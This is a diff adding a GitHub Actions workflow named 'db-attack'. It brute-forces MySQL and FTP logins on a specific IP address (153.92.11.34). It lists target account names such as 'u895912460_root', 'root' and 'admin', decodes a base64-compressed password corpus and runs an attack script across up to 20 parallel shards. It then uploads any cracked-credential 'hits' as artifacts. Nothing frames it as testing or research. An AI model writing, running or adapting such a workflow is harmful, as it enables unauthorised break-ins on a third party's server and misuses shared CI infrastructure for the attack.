@@ -1,0 +1,73 @@
+name: db-attack
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: mode (probe/mysql/ftp/both)
+        required: true
+        default: 'both'
+      shard_list:
+        description: JSON array of shard ids
+        required: false
+        default: '[0]'
+      shards:
+        description: total shards
+        required: false
+        default: '1'
+      conc:
+        description: concurrency
+        required: false
+        default: '24'
+      ftp_user:
+        description: ftp user
+        required: false
+        default: 'u895912460'
+      db_users:
+        description: db users csv
+        required: false
+        default: 'u895912460,u895912460_tronsick,u895912460_tronsick_db,u895912460_tronsick_db_,u895912460_root,root,admin,tronsick,mysql,db'
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: ${{ fromJSON(github.event.inputs.shard_list) }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: deps
+        run: |
+          python3 -m pip install --quiet pymysql >/dev/null 2>&1 || true
+          which mysql || sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq mariadb-client ftp >/dev/null 2>&1 || true
+
+      - name: decode corpus
+        run: |
+          base64 -d attack/corpus.b64 | gunzip > attack/corpus.txt
+          wc -l attack/corpus.txt
+
+      - name: attack
+        env:
+          MODE: ${{ github.event.inputs.mode }}
+          SHARD: ${{ matrix.shard }}
+          SHARDS: ${{ github.event.inputs.shards }}
+          CONC: ${{ github.event.inputs.conc }}
+          FTP_USER: ${{ github.event.inputs.ftp_user }}
+          DB_USERS: ${{ github.event.inputs.db_users }}
+          CORPUS: attack/corpus.txt
+          TARGET: 153.92.11.34
+        run: |
+          echo "===== shard $SHARD / $SHARDS mode $MODE ====="
+          python3 attack/attack.py 2>&1 | tee attack_out.txt
+          echo "===== done shard $SHARD ====="
+
+      - name: upload hits
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: hits-${{ matrix.shard }}
+          path: hits/
+          if-no-files-found: ignore
